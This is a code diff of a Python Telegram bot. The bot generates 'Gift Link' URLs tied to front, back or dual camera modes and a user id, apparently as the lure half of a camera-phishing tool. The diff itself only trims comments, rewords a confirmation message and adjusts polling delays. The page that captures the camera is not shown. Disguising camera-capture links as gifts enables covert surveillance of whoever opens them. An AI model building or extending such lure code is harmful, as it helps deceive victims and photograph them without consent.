@@ -41,14 +41,12 @@ def callback_query(call):
     user_id = call.message.chat.id
     
     if call.data == "check_join":
-        # Layout as per your request
         markup = types.InlineKeyboardMarkup()
         btn_front = types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front")
         btn_back = types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back")
         btn_dual = types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual")
         btn_support = types.InlineKeyboardButton("🧑‍💻 Contact Support", url=CONTACT_SUPPORT_LINK)
         
-        # Adding buttons in the specific grid format
         markup.row(btn_front, btn_back)
         markup.row(btn_dual)
         markup.row(btn_support)
@@ -60,7 +58,7 @@ def callback_query(call):
         base_url = request.host_url.rstrip('/')
         link = f"{base_url}/?m={mode}&uid={user_id}"
         
-        bot.answer_callback_query(call.id, "Link Generated! ✅")
+        bot.answer_callback_query(call.id, "Link Generated Successfully! ✅")
         bot.send_message(user_id, f"🎁 <b>Your Gift Link:</b>\n\n<code>{link}</code>", parse_mode='HTML')
 
 @bot.message_handler(commands=['broadcast'])
@@ -94,14 +92,14 @@ if __name__ == "__main__":
     init_db()
     
     def run_bot():
-        time.sleep(5) 
+        time.sleep(10) # Wait for old instance to terminate
         while True:
             try:
                 bot.remove_webhook()
-                bot.polling(none_stop=True, interval=2, timeout=60)
+                bot.polling(none_stop=True, interval=3, timeout=60)
             except Exception:
-                time.sleep(10)
+                time.sleep(15)
 
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
-        
+    
